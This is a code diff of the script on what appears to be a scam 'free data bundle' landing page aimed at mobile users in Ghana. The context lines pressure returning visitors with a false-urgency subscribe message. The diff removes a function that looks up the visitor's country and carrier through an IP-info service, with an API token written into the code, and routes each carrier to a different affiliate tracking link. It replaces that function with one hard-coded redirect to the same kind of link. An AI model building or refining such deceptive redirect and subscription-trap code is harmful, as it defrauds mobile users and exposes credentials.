@@ -119,14 +119,11 @@ setTimeout(() => {
   } else {
     // RETURNING VISIT
 
-    // Change message
     document.getElementById("offerMessage").innerText =
       "⚠️ You may not qualify again. Subscribe now to receive your data bundle.";
 
-    // Remove title
     document.getElementById("titleText").style.display = "none";
 
-    // Change price to validity
     const priceBox = document.getElementById("priceText");
     priceBox.innerText = "Valid for 30 days";
     priceBox.classList.remove("bg-green-100", "text-green-700");
@@ -136,41 +133,7 @@ setTimeout(() => {
 }, 15000);
 </script>
 
-<!-- NETWORK REDIRECT -->
 <script>
-function detectNetwork() {
-  fetch("https://ipinfo.io/json?token=55355b912bdc12")
-    .then(res => res.json())
-    .then(data => {
-
-      const network = data.org ? data.org.toLowerCase() : "";
-      const country = data.country || "";
-
-      // Ghana only fallback safety
-      if (country !== "GH") {
-        window.location.href = "https://vdbsvtk.com/cl/67a9642f26918e02";
-        return;
-      }
-
-      if (network.includes("mtn")) {
-        window.location.href = "https://vdbsvtk.com/cl/021c421418cf3f46";
-
-      } else if (network.includes("airtel") || network.includes("tigo")) {
-        window.location.href = "https://vdbsvtk.com/cl/67a9642f26918e02";
-
-      } else if (network.includes("telecel") || network.includes("vodafone")) {
-        window.location.href = "https://www.whencominghome.wiki/click?offer_id=34439&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE";
-
-      } else {
-        window.location.href = "https://vdbsvtk.com/cl/67a9642f26918e02";
-      }
-
-    })
-    .catch(() => {
-      window.location.href = "https://vdbsvtk.com/cl/67a9642f26918e02";
-    });
-}
-
 document.addEventListener("DOMContentLoaded", function() {
   const btn = document.querySelector('#congratsBox button');
   if (!btn) return;
@@ -186,7 +149,7 @@ document.addEventListener("DOMContentLoaded", function() {
     `;
 
     setTimeout(() => {
-      detectNetwork();
+      window.location.href = "https://vdbsvtk.com/cl/67a9642f26918e02";
     }, 2000);
   });
 });
